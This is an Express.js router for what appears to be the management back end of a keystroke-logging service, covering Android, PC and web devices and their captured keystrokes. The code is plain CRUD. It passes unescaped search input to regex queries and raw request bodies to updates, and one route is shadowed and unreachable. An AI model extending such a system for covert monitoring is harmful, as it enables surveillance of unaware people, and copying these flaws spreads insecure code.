const express = require('express');
const Device = require('../models/Device');
const Keystroke = require('../models/Keystroke');
const authMiddleware = require('../middleware/auth');

const router = express.Router();

// GET /api/devices - List all devices
router.get('/', authMiddleware, async (req, res) => {
  try {
    const { page = 1, limit = 50, status, type, search } = req.query;
    const query = {};

    if (status) query.status = status;
    if (type) query.type = type;
    if (search) {
      query.$or = [
        { name: { $regex: search, $options: 'i' } },
        { deviceId: { $regex: search, $options: 'i' } },
        { os: { $regex: search, $options: 'i' } }
      ];
    }

    const devices = await Device.find(query)
      .sort({ lastSeen: -1 })
      .skip((page - 1) * limit)
      .limit(parseInt(limit));

    const total = await Device.countDocuments(query);

    res.json({
      devices,
      total,
      page: parseInt(page),
      pages: Math.ceil(total / limit)
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error.' });
  }
});

// GET /api/devices/:deviceId - Get device details
router.get('/:deviceId', authMiddleware, async (req, res) => {
  try {
    const device = await Device.findOne({ deviceId: req.params.deviceId });
    if (!device) {
      return res.status(404).json({ error: 'Device not found.' });
    }
    res.json(device);
  } catch (err) {
    res.status(500).json({ error: 'Server error.' });
  }
});

// PUT /api/devices/:deviceId - Update device
router.put('/:deviceId', authMiddleware, async (req, res) => {
  try {
    const updates = req.body;
    delete updates._id;
    delete updates.deviceId;

    const device = await Device.findOneAndUpdate(
      { deviceId: req.params.deviceId },
      { $set: updates },
      { new: true }
    );

    if (!device) {
      return res.status(404).json({ error: 'Device not found.' });
    }
    res.json(device);
  } catch (err) {
    res.status(500).json({ error: 'Server error.' });
  }
});

// DELETE /api/devices/:deviceId - Delete device and its keystrokes
router.delete('/:deviceId', authMiddleware, async (req, res) => {
  try {
    await Device.findOneAndDelete({ deviceId: req.params.deviceId });
    await Keystroke.deleteMany({ deviceId: req.params.deviceId });
    res.json({ message: 'Device and associated data deleted.' });
  } catch (err) {
    res.status(500).json({ error: 'Server error.' });
  }
});

// GET /api/devices/stats/summary - Get device statistics
router.get('/stats/summary', authMiddleware, async (req, res) => {
  try {
    const totalDevices = await Device.countDocuments();
    const onlineDevices = await Device.countDocuments({ status: 'online' });
    const androidDevices = await Device.countDocuments({ type: 'android' });
    const pcDevices = await Device.countDocuments({ type: 'pc' });
    const webDevices = await Device.countDocuments({ type: 'web' });
    const totalKeystrokes = await Keystroke.countDocuments();

    res.json({
      totalDevices,
      onlineDevices,
      androidDevices,
      pcDevices,
      webDevices,
      totalKeystrokes
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error.' });
  }
});

module.exports = router;

